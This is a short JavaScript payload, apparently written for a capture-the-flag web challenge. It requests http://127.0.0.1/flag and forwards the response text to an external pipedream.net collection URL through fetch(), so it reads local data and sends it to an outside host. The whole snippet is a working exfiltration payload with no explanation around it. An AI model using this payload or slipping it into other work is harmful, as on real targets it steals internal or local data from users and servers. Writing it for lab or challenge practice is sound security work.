function reqListener () {
  fetch("https://enj1mevg4ope.x.pipedream.net/?"+this.responseText);
}
const req = new XMLHttpRequest();
req.addEventListener("load", reqListener);
req.open("GET", "http://127.0.0.1/flag");
req.send();
